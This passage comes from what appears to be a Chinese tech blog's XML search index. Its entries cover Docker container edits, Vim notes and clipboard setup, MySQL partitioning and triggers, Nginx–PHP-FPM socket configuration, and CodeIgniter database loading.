exec -it mynginx bashOCI runtime exec failed: exec failed: container_linux.go:296: starting container process caused "exec: \"bash\": executable file not found in $PATH": unknown$ docker exec -it mynginx ls /bin/bashls: /bin/bash: No such file or directory说明没有 bash，因此可以使用 sh$ docker exec -it mynginx sh$ echo "&lt;center&gt;&lt;h1&gt;Hello docker&lt;/h1&gt;&lt;/center&gt;" &gt; /usr/share/nginx/html/index.html停止容器、容器的改变不会影响基础镜像，所以再次启动基础镜像时，内容不变$ docker stop mynginx$ docker rm mynginx$ docker run --name mynginx -d -p 80:80 nginx:alpine 使用 docker commit 保存容器存储层的改变 1docker commit --author "Syncher" --message "updated index.html" mynginx nginx:alpine]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《Vim 实用技巧》读书笔记（第二部分）]]></title>
    <url>%2Fexperience%2Fpractice%2Flinux-reading-note-of-practical-vim-II%2F</url>
    <content type="text"><![CDATA[本文接上一篇文章 ，本章节主要记录《Vim 适用技巧》第二部分文件相关操作的学习笔记。 缓冲区、缓冲区列表缓冲区是文件在内存中的映射，Vim 编辑的是缓冲区的内容，在使用 :wirte 等命令时将缓冲区的内容写入文件中。Vim 允许一次打开多个文件，这些文件的缓冲区形成了 Vim 的缓冲区列表，:ls 查看缓冲区列表，结果中 % 表示当前可视缓冲区，# 代表轮换文件，使用 &lt;C-^&gt;可以快速在缓冲区列表中切换。使用 :bnext 和 :bprev 在缓冲区列表中切换，:bfirst，:blast 等命令顾名思义既可。使用 :ls 显示的缓冲区列表中有一个编号和名字，可以凭借 :buffer {number} 或 :buffer {name} 直接精确跳转。:bdelete{number} 可以删除指定的缓冲区，如果缓冲区内容修改后没有保存到文件中则会有保存或者放弃的提示。 参数列表:args 显示缓冲区列表 工作区切分成窗口s 水平切分，等效区 :splitv 垂直切分，等效区 :vsplit{h|j|k|l} 对切换活动窗口，如 j 代表切换到下面的窗口使用 :only 关闭处活动窗口以外其他窗口，:close 或 :q 关闭活动窗口 标签页标签页可以理解为容纳一系列窗口的容器。:tabedit [filename] 在新标签中打开文件:tabclose 关闭当前标签页gt 切换到下一个标签页 等效与 :tabngT 切换到上一个标签页 等效与 :tabptabmove 移动标签页 使用 netwr 管理文件和目录:edit . 等效于 :e. 打开文件管理器,并显示当前工作目录:Explore 等效与 :E 打开文件管理器,并显示活动缓冲区所在的目录:Vexplore 垂直分割窗口并显示缓冲区所在的目录:Sexplore 水平分割窗口并显示缓冲区所在的目录:netrw-d 创建目录:netrw-rename 重命名:netrw-del 删除当edit {path/file} 目录不存在时，我们试图把缓冲区写入磁盘 时,Vim 会显示一条出错信息。在这种情况下,我们可以调用外部的 mkdir 程序 对此做出补救: 1:! mkdir -p %:h 使用普通用户读取 root 用户文件强制保存的方法 1234 :w !sudo tee % &gt; /dev/null解释： :w !&#123;cmd&#125; 缓冲区的内容作为 shell 命令的标准输入 sudo tee [buffer] /path/filename &gt; /dev/null 未完待续……]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Vim</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《Vim 实用技巧》读书笔记]]></title>
    <url>%2Fexperience%2Fpractice%2Flinux-reading-note-of-practical-vim-I%2F</url>
    <content type="text"><![CDATA[知识源于不断实践与训练，认知源于认真阅读，知识应该是衡量一个人的重要标准。 掌握一项技能对一个人的改变的多少取决于获得这项技能所花费的时间，这就是我下定决心要学习 Vim 的原因。《Vim 实用技巧》是一本学习 Vim 非常高效的书，以下为阅读此书中摘录和总结的一些技能，以便后续查阅。 使用 * 对光标下的单词进行搜索 使用 . 重复上一次的修改 在如下代码种每行末尾添加 ”;“ 123var foo = 1var bar = &apos;a&apos;var foobar = foo + bar 方法一、 $a; 然后 j$. 方法二、 $A; 然后 j. 方法三、 $A; 然后 SHIFT-V 选择两行，:&lt;’,’&gt; nomarl . 注：以下命令为等效命令，并且都是从普通模式切换到插入模式 A &lt;==&gt; $a C &lt;==&gt; c$ s &lt;==&gt; cl S &lt;==&gt; ^c 删除整行从头插入 I &lt;==&gt; ^i o &lt;==&gt; A&lt;CR&gt; O &lt;==&gt; ko 以退为进—— 给以下代码种 + 号前后添加空格 1var foo = &quot;method(&quot;+argument1+&quot;,&quot;+argument2+&quot;)&quot;; 使用 f+ 找到 + 号，然后 s 先删除 + 在写入 + 重复 3 次 ;. 注： 使用 :s/target/replacement 执行替换的时候 &amp; 重复下一个替换，u 撤销替换 使用 * 查找光标下的单词 插入分块，使得撤销拥有粒度，比如在插入模式种使用 o 另起一行，而不是直接 构造可重复性修改，如下假设光标位于 h 字符上，要删除整个单词 1The end is nigh 方法一、dbx 方法二、bdw 方法三、daw 大小写转换 1234this is a HTML doc!g~gugU 插入模式删除操作 相当于 Backspace 删除前一个单词 删除至行首 这些命令在 shell 下也有效 插入模式切换到普通模式&lt;C-[&gt; 等效与 插入模式切换到普通模式执行一次命令后再次回到插入模式 在插入模式种使用 {register} 将寄存器种的内容粘贴到光标后面。使用 :reg 查看寄存器及寄存器种的内容，其中 + 为系统剪切板。需要注意的是如果开启 textwidth 和 autoindent 选项时粘贴文本可能会发生不必要的缩进，发生格式错乱。这时，可以使用 {reg} 按原意插入文本并修正不必要的缩进，也可以退回到普通模式种对文本进行粘贴。 使用=寄存器做运算，在插入模式下 ={算术表达式} {字符编码} 插入非常用字符，如果 后面的表达式是一个非数字键，则会插入这个非数字键本身所代表的字符。例如在 expandtab 选项开启的情况下， 键会插入与其等宽的多个空格，但是使用 会插入其本身字符，不管 expandtab 选项是否开启。 二合字母在插入模式下使用 {char1}{char2} 可输入二合字母，如 ¼ 14，使用 :h digrah-table 可以查看二合字母列表 使用 键或者 R 切换到替换模式，r 替换当前字符，使用 tabstop 设置 键占宽度，这导致 在替换模式下会出现位置错乱，因此可以使用 gR 触发虚拟替换模式，虚拟替换模式是按屏幕实际显示的宽度来替换字符的。 可视模式面向字符的可视模式 v 普通模式与此模式之间切换面向整行的可视模式 V 普通模式与此模式之间切换面向列块的可视模式 普通模式与此模式之间切换 注：gv 用于重选上一次由可视模式所选择的文本范围可视模式下 o 用于切换选择文本的活动段 选择模式 可以在可视模式与选择模式之间切换，选择模式中输入字符会替换选中内容。 在可视模式下，. 模式容易出现意想不到的问题，因此在面对重复修改时应尽量选操作命令而不是可视化命令。 命令行模式 Ex 命令:edit 编辑:write 保存:read 读取文件内容粘贴到光标所在位置:split 分割窗口 sp/vs 操作缓冲区文本的 Ex 的命令:[range]delete [x] 删除指定范围内的行[到寄存器x种]:[range]yank [x] 复制指定范围的行[到寄存器x种]:[range]put [x] 粘贴 x 寄存器内容:[range]copy {address} 拷贝指定行内容到 {address} 下，:copy 缩写为 :t 或 :co:[range]move {address} 移动，:move 缩写为 :m:[range]jion 连接指定行:[range]normal {commands} 对指定范围内所有行执行命令:[range]substitute/{pattern}/{string}/flag 替换:[range]global/{pattern}/[cmd] 对所有匹配到的所有行都执行Ex 命令[cmd] 命令模式下范围语法1 文件第一行$ 文件最后一行0 虚拟行，位于第一行前. 光标所在行‘m 包行位置标记 m 的行‘&lt; 高亮选区的起始行‘&gt; 高亮选区的结束行% 整个文件，:1,$ 等效 在命令模式下，使用 @: 重复上次的 Ex 命令，相当于普通模式下的 . 使用 不全 Ex 命令， 列出不全列表， 补全行为可以通过 wildmode 选项设置，默认补全行为是 full，设置 set wildmode=longest,list 即和 bash shell 下的补全方式相同。 在命令模式下使用 将光标下的单词输入到命令行中，使用 可以回溯历史命令，默认历史命令保留 20 条，使用 history 参数可以设定保留的历史命令条目数。 set history = 500。也可以使用 和 组合键来反向或正向遍历历史命令，但 和 命令有个缺点,它们不会像 和 那样对历史命令进行过滤。通过创建下面的自定义映射项,我们可以把二者的优点结合到一起: 12cnoremap &lt;C-p&gt; &lt;Up&gt;cnoremap &lt;C-n&gt; &lt;Down&gt; 使用 q: 调出历史命令列表 命令模式中运行 Shell 命令 :! [shellcmd]，% 代表当前编辑的文件名，如果向在命令模式下连续执行几条命令，可以使用 :shell 开启一个交互的 shell 会话，exit 退出 shell 会话，可以使用 :read !{cmd} 将 shell 命令的输出读入当前缓冲区:[range]write !{cmd} 在 shell 中执行 {cmd} ,以 [range] 作为其标准输入:[range]!{filter} 使用外部程序 {filter} 过滤指定的 [range] 未完待续 ……]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Vim</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vim 使用系统剪切板]]></title>
    <url>%2Fexperience%2Fpractice%2Flinux-vim-using-system-clipboard%2F</url>
    <content type="text"><![CDATA[VIM 支持很多种剪切板，常见的有 0,2,3,…,9,a,和”，如果开启了系统剪切板，则还有 + 和 *，可使用命令:reg 查看各剪切板的状态。 VIM 开启剪切板如果 :reg 种没有 + 剪切板，通过在终端种执行shell命令vim --version | grep clipboard 查看结果123$ vim --version | grep clipboard-clipboard +jumplist +persistent_undo +virtualedit-ebcdic -mouseshape +statusline -xterm_clipboard +clipboard表示选项开启，-clipboard表示未开启，对于 arch Linux 我们可以使用以下任意一种方式启用系统剪切板。 方法一、使用 gvim1$ pacman -S gvim 这种方式仅使用 gvim 替换 vim，不会改变原来 vim 的配置，简单实用。 方法二、使用 abs 重新编译 Vim123$ pacman -S abs$ abs extra/vim$ cp -r /var/abs/extra/vim ~/ &amp;&amp; cd ~/vim 修改 PKGBUILD 文件123456789PKGBUILD...pkgname=(&apos;vim&apos; &apos;gvim&apos; &apos;vim-runtime&apos;)$ 去除不需要编译的包$ 至于编译依赖，不了解可以像我一样选择不取消...--with-x=yes \$ 把 Vim 编译选项中 --with-x 的 no 改为 yes... 编译并创建包 1$ makepkg -s 安装 Vim 1$ pacman -U vim-7.3.754-1-x86_64.pkg.tar.xz 重启 Vim. 参考链接-Arch Linux 启用系统剪切板]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Vim</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL 特性之分区表]]></title>
    <url>%2Ffundamental%2Fstorage%2Fmysql-features-of-partition%2F</url>
    <content type="text"><![CDATA[对于小量数据来讲，数据库的优化往往是建立高效的索引策略，最常用的索引类型是 B-Tree 索引。然而量变引起质变，在单表数据量较大时，B-Tree索引就无法起作用了。除非是索引覆盖查询，否则数据库服务器需要根据索引扫描的结果回表，查询所有符合条件的记录，如果数据量巨大，这将产生大量随机I/O，随之，数据库的响应时间将大到不可接受的程度。另外，索引维护（磁盘空间、I/O操作）的代价也非常高。 分表与分区分表分表又可分为垂直分表和水平分表。 垂直分表原因： 1.对于 InnoDB引擎来讲，主索引叶子节点存储着当前行的所有信息，所以减少字段可使内存加载更多行数据，有利于查询。 2.受限于操作系统中的文件大小限制。 切分原则： 把不常用或业务逻辑不紧密或存储内容比较多的字段分到新的表中可使表存储更多数据。 水平分表：原因： 1.随着数据量的增大，行数巨大，索引失效，查询的效率越来越低。 2.同样受限于操作系统中的文件大小限制，数据量不能无限增加，当到达一定容量时，需要水平切分以降低单表（文件）的大小。 切分原则： 增量区间或散列或其他业务逻辑。 使用哪种切分方法要根据实际业务逻辑判断。比如对表中有时间字段，就可以根据时间区间分表。 如果对表的访问较均匀，没有明显的热点区域，则可以考虑用范围（比如每500w一个表）或普通 Hash 或一致性Hash来切分。 分区 在日常的工作中，我们经常遇到一张表里面保存了上亿甚至过十亿的记录。这些表里面保存了大量的历史记录，并且对历史数据的访问较少，有明显的冷热区分，由于数据量剧增会导致热点数据查询效率降低，当想清除无效的历史数据时，因为清楚数据量较大会使得锁表时间变长，对数据库的造成了很大压力。即使把这些无效数据删除了，底层的数据文件并没有变小。面对这类问题，最有效的方法就是在使用分区表。最常见的分区方法就是按照时间进行分区。 分区的优点是可以解决大数据量下的慢查询，也可以非常高效的进行历史数据的清理。 分区功能并不是在存储引擎层完成的，因此不只有 InnoDB 存储引擎支持分区，常见的存储引擎MyISAM、NDB等都支持分区。但是并不是所有的存储引擎都支持，如 CSV、FEDORATED、MERGE 等就不支持分区。在使用此分区功能前，应该对选择的存储引擎对分区的支持有所了解。 可以通过使用SHOW VARIABLES 命令来确定 MySQL 是否支持分区，例如： 1mysql&gt; SHOW VARIABLES LIKE &apos;%partition%&apos;; 分区表冷热数据分离实践业务场景 某订单表中冷热数据区分明显，现将历史数据迁移到一张新的历史表中，历史表属分区表。 建表热点表 1234567CREATE TABLE `t_hot` ( `id` int(11) NOT NULL , `date` date DEFAULT NULL, -- omitted other column `last_update` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, KEY `IX_DCCC` (`date`,`col_1`,`col_2`,`col_3`)) ENGINE=InnoDB DEFAULT CHARSET=utf8; 历史表 12345678CREATE TABLE `t_history` ( `id` int(11) NOT NULL , `date` date DEFAULT NULL, -- omitted other column `last_update` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,) ENGINE=InnoDB DEFAULT CHARSET=utf8 PARTITION BY RANGE(TO_DAYS(`date`)) ( PARTITION p_defalut VALUES LESS THAN (MAXVALUE)); 数据迁移使用脚本将热点数据迁移到历史表中，迁移过程如下 1234567891011121314151617public function moveGeData() &#123; // 如果表不存在，则建表 ... omitted ... // 一月新增一个分区 $month_ago = date('Y-m-d',time() - 1 * 30 * 24 * 60 * 60); $ym = date('ym',(strtotime($six_months_ago)-1)); $partition = "ALTER TABLE t_history REORGANIZE PARTITION pmax INTO (PARTITION p&#123;$ym&#125; VALUES LESS THAN (TO_DAYS('&#123;$month_ago&#125;')),PARTITION pmax VALUES LESS THAN MAXVALUE)"; $this-&gt;db-&gt;query($partition); echo "add partition:$partition\n"; // 迁移 $sql_insert = "insert into t_history select * from t_hot where date &lt;= '$month_ago';"; $ret = $this-&gt;db-&gt;query($sql_insert)-&gt;affect_rows(); $sql_del = "delete from t_hot where date &lt;= '$month_ago' limit ".$ret; $this-&gt;db-&gt;query($sql_del); echo "[Done ".date("h:i:s")."]\n";&#125; 参考http://xieminis.me/?p=216 http://www.cnblogs.com/tinywan/p/6625432.html https://www.awaimai.com/371.html]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Storage</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>分区表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx 与 PHP-FPM 通信机制]]></title>
    <url>%2Fexperience%2Fpractice%2Flinux-nginx-fpm-communication-explaination%2F</url>
    <content type="text"><![CDATA[看完这篇文章，你可以知道 PHP-CGI 是 PHP 解析器 CGI 是一种协议 Fast-CGI 是 CGI 的一个变种 PHP-FPM 是对 Fast-CGI 的实现，是对 PHP-CGI 进程的管理 Nginx 和 PHP-FPM 之间的通信方式 Nginx 与 PHP-FPMNginx（服务器）是内容的分发者，Nginx 启动后会监听某个指定的端口，等待客户端请求。如果通过解析 URI 得知客户端请求的是/index.html文件，服务器会去文件系统中找到这个文件，发送给浏览器，这里分发的是静态数据。如果现在请求的是/index.php，根据配置文件，服务器知道这不是静态文件，需要去找 PHP 解析器 （PHP-CGI）来处理。PHP-CGI 收到/index.php这个请求后，会解析 php.ini 文件，初始化执行环境，然后处理请求，再以规定 CGI 规定的格式返回处理后的结果，退出进程。Nginx 再把结果返回给浏览器。 Nginx 调用 PHP-CGI 时会传第必要的信息如 URI、URL 参数、POST、HTTP header 等，通用网关接口 （CGI ） )规定了从 Nginx 到 PHP-CGI 之间的数据传输格式。 PHP-CGI 接收到 CGI 传来的数据后：环境初始化 –&gt; 处理请求 –&gt; 返回结果 –&gt; 杀死进程 。每个请求都将对应一个 PHP-CGI 进程，因此导致服务器性能下降，并发不高。因此出现了一种新的协议叫 快速通用网关接口（FastCGI），FastCGI 的主要目标是减少 Web 服务器和 CGI 程序之间通信的开销，允许服务器一次处理更多的网页请求。 PHP-FPM 就是 FastCGI 协议的实现，对于 Fast-CGI 程序，不是每个请求都创建一个进程，PHP-FPM 会先启一个 Master 进程 –&gt; 解析配置文件 –&gt; 初始化执行环境 –&gt; 启动多个 Worker。每个 Worker 都是一个 PHP-CGI，当请求过来时，Master 会将请求交给一个 Worker，然后立即可以接受下一个请求。PHP-FPM 对 PHP-CGI 进程进行管理，当 Worker 不够用时，Master 可以根据配置预先启动几个Worker ；当然空闲 Worker 太多时，也会停掉一些，这样就提高了性能，也节约了资源。 Nginx 与 PHP-FPM 通信机制与配置Nginx 和 FastCGI 的通信方式有两种，一种是 TCP socket，一种是 Unix domain socket 。连接示意图如下： 配置方式TCP通信配置第一步，编辑 Nginx 配置文件 /path/to/nginx/conf/your-stie.conf 如果 PHP-FPM 和 Nginx 在同一台机器上，将 fastcgi_pass参数修改为127.0.0.1:9000，不在同一台机器时，将127.0.0.1替换为 PHP-FPM 所在机器的 IP， 如下： 1234567location ~ \.php$ &#123; index index.php index.html index.htm; include /etc/nginx/fastcgi_params; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi_params; &#125; 第二步，编辑PHP-FPM 配置文件 /path/to/php/etc/php-fpm.conf 将 listen 参数修改为 your-php-fpm-ip:9000，如下： 1listen = 127.0.0.1:9000 第三步，重启或重新载入 Nginx 和 PHP-FPM 的配置 1234service nginx reload# kill all php-fpmpgrep php-fpm | xargs killcd /path/to/php/sbin/ &amp;&amp; ./php-fpm Unix socket 配置方式Unix socket其实严格意义上应该叫 Unix domain socket，它是 *nix 系统进程间通信（IPC）的一种被广泛采用方式，以文件（一般是 .sock ）作为 socket 的唯一标识（描述符），需要通信的两个进程引用同一个 socket 描述符文件就可以建立通道进行通信了。 第一步，决定你的 socket 描述符文件的存储位置。 可以放在系统的任意位置，如果想要更快的通信速度，可以放在 /dev/shm下面，这个目录是所谓的 tmpfs，是RAM 可以直接使用的区域，所以，读写速度都会很快。 决定了文件位置，就要修改文件的权限了，要让 Nginx 和 PHP-FPM 对它都有读写的权限，可以这样： 123sudo touch /dev/shm/fpm-cgi.socksudo chown www-data:www-data /dev/shm/fpm-cgi.socksudo chmod 666 /dev/shm/fpm-cgi.sock 第二步，修改 PHP-FPM 配置文件 /path/to/php/etc/php-fpm.conf 12345listen = /dev/shm/fpm-cgi.sock; Set listen(2) backlog. A value of '-1' means unlimited.; Default Value: 128 (-1 on FreeBSD and OpenBSD)listen.backlog = -1 注意： 要注意根据并发调整 listen.backlog 参数的值，默认是128，在高并发下可以改为-1，表示可以无限使用连接，最大连接限制有操作系统层控制。如下可以修改限制： 12sudo echo 'net.core.somaxconn = 2048' &gt;&gt; /etc/sysctl.confsudo sysctl -p 第三步，修改 Nginx 站点配置文件 /path/to/nginx/conf/your-stie.conf 1234567location ~ \.php$ &#123; index index.php index.html index.htm; include /etc/nginx/fastcgi_params; fastcgi_pass /dev/shm/fpm-cgi.sock; fastcgi_index index.php; include fastcgi_params; &#125; 第四步，重启或重新载入 Nginx 和 PHP-FPM 的配置 1234service nginx reload# kill all php-fpmpgrep php-fpm | xargs killcd /path/to/php/sbin/ &amp;&amp; ./php-fpm 两种通信方式的分析和总结从原理上来说，Unix socket 方式肯定要比 TCP 的方式快而且消耗资源少，因为 TCP 需要经过本地回环驱动，还要申请临时端口。 Unix socket 会显得不是那么稳定，当并发连接数爆发时，会产生大量的长时缓存，在没有面向连接协议支撑的情况下，大数据包很有可能就直接出错并不会返回异常。而 TCP 这样的面向连接的协议，多少可以保证通信的正确性和完整性。 参考http://xieminis.me/?p=216 http://www.cnblogs.com/tinywan/p/6625432.html https://www.awaimai.com/371.html]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CodeIgniter load database 分析]]></title>
    <url>%2Ffundamental%2Fprogramming-language%2Fphp%2Fphp-codeigniter-load-database-analysis%2F</url>
    <content type="text"><![CDATA[使用 CodeIgniter 2.x 可以配置 autoload 自动加载数据库，也可以在 Model 的构造函数中使用$this-&gt;load-&gt;database()方法加载数据库： 123456789101112# xxx.modelrequire_once 'db_config.php';class xxx_model extends CI_Model&#123; public function __construct() &#123; $this-&gt;db = $this-&gt;load-&gt;database(DB_Config::$db_config["mydb"], true); &#125; // other code ...&#125; database() 方法$this-&gt;load-&gt;database()方法位于 system/core/Loader.php中，此方法返回 DB($params, $active_record) 123456789101112131415161718192021222324252627282930313233/** * Database Loader * * @param string the DB credentials * @param bool whether to return the DB object * @param bool whether to enable active record (this allows us to override the config setting) * @return object */ public function database($params = '', $return = FALSE, $active_record = NULL)&#123; // Grab the super object $CI =&amp; get_instance(); // Do we even need to load the database class? if (class_exists('CI_DB') AND $return == FALSE AND $active_record == NULL AND isset($CI-&gt;db) AND is_object($CI-&gt;db)) &#123; return FALSE; &#125; require_once(BASEPATH.'database/DB.php'); if ($return === TRUE) &#123; return DB($params, $active_record); &#125; // Initialize the db variable. Needed to prevent // reference errors with some configurations $CI-&gt;db = ''; // Load the DB class $CI-&gt;db =&amp; DB($params, $active_record);&#125; DB() 方法DB()方法位于 system/database/DB.php 中，此方法重点完成以下两个任务 new $driver($params) $DB-&gt;initialize() 1234567891011121314151617181920212223242526/** * Initialize the database * * @category Database * @author EllisLab Dev Team * @link http://codeigniter.com/user_guide/database/ * @param string * @param bool Determines if active record should be used or not */function &amp;DB($params = '', $active_record_override = NULL)&#123; // Load the DB config file if a DSN string wasn't passed // ... some code here require_once(BASEPATH.'database/drivers/'.$params['dbdriver'].'/'.$params['dbdriver'].'_driver.php'); // Instantiate the DB adapter $driver = 'CI_DB_'.$params['dbdriver'].'_driver'; $DB = new $driver($params); if ($DB-&gt;autoinit == TRUE) &#123; $DB-&gt;initialize(); &#125; // some code here ... return $DB;&#125; 当 autoinit 为 true 时，自动初始化数据库，$DB-&gt;initialize()，此方法位于 system/database/DB_driver.php中 12345678910111213141516171819202122232425/** * Initialize Database Settings * * @access private Called by the constructor * @param mixed * @return void */function initialize()&#123; // If an existing connection resource is available // there is no need to connect and select the database if (is_resource($this-&gt;conn_id) OR is_object($this-&gt;conn_id)) &#123; return TRUE; &#125; // ---------------------------------------------------------------- // Connect to the database and set the connection ID $this-&gt;conn_id = ($this-&gt;pconnect == FALSE) ? $this-&gt;db_connect() : $this-&gt;db_pconnect(); // No connection resource? Throw an error // some code here ... return TRUE;&#125; 数据库长连接根据 $this-&gt;pconnect 决定数据库使用长连接或者短连接，$this-&gt;pconnect 的取值在数据库配置文件中配置。MySQL 的长连接是存在 php-fpm 子进程里的，进程之间是不共享连接的，所以每个 php-fpm 进程都有一个单独的长连接。使用 ps -aux | grep fpm 和 netstat -anp | grep 3306 可分别查看 fpm 子进程个数和 MySQL 长连接个数相同。 使用 MySQL 长连接可以复用连接通道，减小连接时延，当 PHP 应用访问量不高，并发量不大时，我们只需要开启少量 php-fpm 子进程，每个子进程对应一个 MySQL 连接，但是当应用并发增加， php-fpm 子进程数量扩大时，MySQL 连接数也随之增加，对数据库造成较大压力，特别是当连接数达到数据库上限时会导致其他 fpm 连接异常。因此要注意使用长连接时 fpm 的子进程数不应超过数据库的最大连接数，在数据库中使用SHOW VARIABLES like &#39;max_connections&#39;; 查看数据库最大连接数。 1234567//查看MySQL最大连接数mysql&gt; SHOW VARIABLES like 'max_connections';+-----------------+-------+| Variable_name | Value |+-----------------+-------+| max_connections | 20000 |+-----------------+-------+ 数据库初始化关于 autoinit ： CI 2.x 中默认为 true, 有些业务场景使用缓存且缓存命中率较高，若启用 autoinit，处理每个请 PHP 求时都会去连接数据库，耗时严重。使用 strace -c -p 360558 分析 360558 (FPM 进程id) 进程程序执行情况得出， 程序执行时 read 操作耗时最长。 再使用 strace -p 360558 2&gt;&amp;1 查看 360558 (FPM 进程id) 进程程序执行情况发现有大量的 read() 和 write() 操作，经分析发现一个参数为 4 的时候为数据库相关操作。 将 autoinit 改为 false 后，read 和 write 耗时几乎为 0. 需要注意的时将 autoinit 改为 false 后，CI 会报如下错误： 1mysql_escape_string(): This function is deprecated; use mysql_real_escape_string() instead. 参照 https://stackoverflow.com/questions/26169455/codeigniter-use-mysql-real-escape-string-instead-database-connection-issue 修改 system/database/drivers/mysql/mysql_driver.php下的 escape_str() 为： 1234567891011121314151617181920212223242526272829function escape_str($str, $like = FALSE)&#123; if (is_array($str)) &#123; foreach ($str as $key =&gt; $val) &#123; $str[$key] = $this-&gt;escape_str($val, $like); &#125; return $str; &#125; if (function_exists('mysqli_real_escape_string') AND is_object($this-&gt;conn_id)) &#123; $str = mysqli_real_escape_string($this-&gt;conn_id, $str); &#125; else &#123; $str = addslashes($str); &#125; // escape LIKE condition wildcards if ($like === TRUE) &#123; $str = str_replace(array('%', '_'), array('\\%', '\\_'), $str); &#125; return $str;&#125;]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Programing-language</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL 触发器相关的 SQL]]></title>
    <url>%2Ffundamental%2Fstorage%2Fmysql-sql-about-trigger%2F</url>
    <content type="text"><![CDATA[触发器（英语：trigger）是在数据库中，在执行对数据有异动的动作时，先行拦截并处理的一种数据库对象，它大部分会设在数据表中，作为强制运行特定动作的程序，因此又称为数据操纵语言(DML)触发器。 创建触发器在MySQL中，创建触发器语法如下： 12345CREATE TRIGGER trigger_nametrigger_timetrigger_event ON tbl_nameFOR EACH ROWtrigger_stmt 其中： trigger_name：标识触发器名称，用户自行指定；trigger_time：标识触发时机，取值为 BEFORE 或 AFTER；trigger_event：标识触发事件，取值为 INSERT、UPDATE 或 DELETE；tbl_name：标识建立触发器的表名，即在哪张表上建立触发器；trigger_stmt：触发器程序体，可以是一句SQL语句，或者用 BEGIN 和 END 包含的多条语句。 由此可见，可以建立6种触发器，即：BEFORE INSERT、BEFORE UPDATE、BEFORE DELETE、AFTER INSERT、AFTER UPDATE、AFTER DELETE。 另外有一个限制是不能同时在一个表上建立2个相同类型的触发器，因此在一个表上最多建立6个触发器。 trigger_event 详解MySQL 除了对 INSERT、UPDATE、DELETE 基本操作进行定义外，还定义了 LOAD DATA 和 REPLACE 语句，这两种语句也能引起上述6中类型的触发器的触发。 LOAD DATA 语句用于将一个文件装入到一个数据表中，相当与一系列的 INSERT 操作。 REPLACE 语句一般来说和 INSERT 语句很像，只是在表中有 primary key 或 unique 索引时，如果插入的数据和原来 primary key 或 unique 索引一致时，会先删除原来的数据，然后增加一条新数据，也就是说，一条 REPLACE 语句有时候等价于一条。 INSERT 语句，有时候等价于一条 DELETE 语句加上一条 INSERT 语句。 INSERT 型触发器：插入某一行时激活触发器，可能通过 INSERT、LOAD DATA、REPLACE 语句触发；UPDATE 型触发器：更改某一行时激活触发器，可能通过 UPDATE 语句触发；DELETE 型触发器：删除某一行时激活触发器，可能通过 DELETE、REPLACE 语句触发。 BEGIN … END 详解在MySQL中，BEGIN … END 语句的语法为： 123BEGIN[statement_list]END 其中，statement_list 代表一个或多个语句的列表，列表内的每条语句都必须用分号（;）来结尾。而在MySQL中，分号是语句结束的标识符，遇到分号表示该段语句已经结束，MySQL可以开始执行了。因此，解释器遇到statement_list 中的分号后就开始执行，然后会报出错误，因为没有找到和 BEGIN 匹配的 END。 这时就会用到 DELIMITER 命令（DELIMITER 是定界符，分隔符的意思），它是一条命令，不需要语句结束标识，语法为：DELIMITER new_delemiternew_delemiter 可以设为1个或多个长度的符号，默认的是分号（;），我们可以把它修改为其他符号，如$：DELIMITER $在这之后的语句，以分号结束，解释器不会有什么反应，只有遇到了$，才认为是语句结束。注意，使用完之后，我们还应该记得把它给修改回来。 一个完整的创建触发器示例1234567891011121314151617181920212223242526272829303132333435# 新增 business 表时往 business_name 表中查数据CREATE TABLE `business` ( `id` int(11) NOT NULL AUTO_INCREMENT, `business_id` int(11) DEFAULT NULL, `business_name` varchar(100) DEFAULT NULL, `create_time` date DEFAULT NULL, `last_update` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, PRIMARY KEY (`id`))# business_nameCREATE TABLE `business_name` ( `business_id` int(11) DEFAULT NULL , `business_name` varchar(100) DEFAULT NULL COMMENT, `create_time` date DEFAULT NULL, `modified_name` varchar(100) DEFAULT NULL COMMENT, `modified_time` date DEFAULT NULL, `last_update` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, PRIMARY KEY (`business_id`))# 修改分隔符DELIMITER $$CREATE TRIGGER auto_update_busi_nameAFTER INSERT ON businessFOR EACH ROWBEGININSERT INTO business_name(business_id,business_name,create_time,modified_name) VALUSE(new.business_id,new.business_name,new.create_time,new.business_name) ON DUPLICATE KEY UPDATE business_id=new.business_id,business_name=new.business_name,create_time=new.create_time;end$$DELIMITER ; 变量详解MySQL 中使用 DECLARE 来定义一局部变量，该变量只能在 BEGIN … END 复合语句中使用，并且应该定义在复合语句的开头， 即其它语句之前，语法如下： 1DECLARE var_name[,...] type [DEFAULT value] 其中：var_name 为变量名称，同 SQL 语句一样，变量名不区分大小写；type 为 MySQL 支持的任何数据类型；可以同时定义多个同类型的变量，用逗号隔开；变量初始值为 NULL，如果需要，可以使用 DEFAULT 子句提供默认值，值可以被指定为一个表达式。 对变量赋值采用 SET 语句，语法为：** 1SET var_name = expr [,var_name = expr] ... NEW 与 OLD 详解触发器的所在表中，触发了触发器的那一行数据。具体地：在 INSERT 型触发器中，NEW 用来表示将要（BEFORE）或已经（AFTER）插入的新数据；在 UPDATE 